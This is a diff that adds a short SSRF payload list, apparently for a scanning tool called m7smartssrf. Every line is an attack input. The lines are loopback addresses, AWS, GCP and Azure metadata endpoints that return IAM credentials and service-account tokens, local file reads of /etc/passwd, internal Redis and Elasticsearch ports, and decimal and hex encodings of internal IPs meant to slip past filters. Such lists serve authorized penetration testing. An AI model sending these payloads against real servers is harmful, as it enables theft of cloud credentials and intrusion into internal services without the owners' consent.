@@ -1,0 +1,35 @@
+# m7smartssrf - Custom Payload List
+# By: Sharlix | Milkyway Intelligence
+# Format: one payload per line, # = comment
+
+# Internal localhost
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+
+# AWS Metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# GCP Metadata
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# File access
+file:///etc/passwd
+file:///etc/hosts
+
+# Internal services
+http://127.0.0.1:8080/
+http://127.0.0.1:9200/_cat/indices
+http://127.0.0.1:6379/
+
+# Encoded bypasses
+http://2130706433/
+http://0x7f000001/
+http://2852039166/
